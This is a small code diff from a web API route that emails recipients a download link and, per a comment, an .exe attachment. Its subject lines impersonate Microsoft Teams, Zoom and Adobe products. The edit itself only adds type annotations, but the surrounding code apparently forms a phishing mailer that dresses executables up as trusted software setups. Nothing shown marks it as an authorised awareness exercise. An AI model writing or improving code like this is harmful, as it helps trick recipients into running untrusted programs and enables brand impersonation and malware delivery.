@@ -118,14 +118,14 @@ export async function POST(request: NextRequest) {
     const emailHtml = emailTemplate.replace('{{DOWNLOAD_LINK}}', downloadUrl);
     
     // Get subject line based on template
-    const subjectMap = {
+    const subjectMap: Record<string, string> = {
       'voice-note': 'AudioSync Pro - Voice Recording Studio Ready',
       'zoom-meeting': 'ZoomConnect Pro - Your Meeting Room is Ready', 
       'adobe-creative': 'Creative Hub - Your Design Suite is Ready',
       'teams-enterprise': 'Microsoft Teams - Enterprise Setup Complete'
     };
     
-    const emailSubject = subjectMap[templateId] || 'UC Connect Agent - Ready for Download';
+    const emailSubject = subjectMap[templateId as string] || 'UC Connect Agent - Ready for Download';
 
     // Send emails to all recipients with .exe attachment
     const emailResults = [];
